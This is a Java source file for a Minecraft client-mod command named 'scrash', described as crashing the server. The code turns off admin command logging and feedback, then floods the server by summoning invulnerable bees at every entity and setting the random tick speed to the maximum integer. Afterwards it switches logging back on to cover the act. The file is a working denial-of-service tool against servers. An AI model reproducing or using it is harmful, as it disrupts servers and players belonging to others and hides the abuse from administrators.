package spigey.asteroide.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.client.multiplayer.ClientSuggestionProvider;
import net.minecraft.server.permissions.Permission;
import net.minecraft.server.permissions.PermissionLevel;

import static spigey.asteroide.util.msg;
import static spigey.asteroide.util.perm;

public class ServerCrash extends Command {
    public ServerCrash() {
        super("scrash", "Crashes the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<ClientSuggestionProvider> builder) {
        builder.executes(context -> {
            error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
            info("Attempting to crash the server");
            final boolean hasPermissionLevel2 = mc.player.permissions().hasPermission(new Permission.HasCommandLevel(PermissionLevel.GAMEMASTERS));
            assert mc.player != null;
            if(!hasPermissionLevel2){
                error(perm(2));
            }
            if(hasPermissionLevel2){
                msg("/gamerule logAdminCommands false");
                msg("/gamerule sendCommandFeedback false");
            }
            msg("/execute as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
            msg("/gamerule randomTickSpeed 2147483647");
            if(hasPermissionLevel2){
                msg("/save-all");
                msg("/gamerule sendCommandFeedback true");
                msg("/gamerule logAdminCommands true");
            }
            return SINGLE_SUCCESS;
        });
    }
}
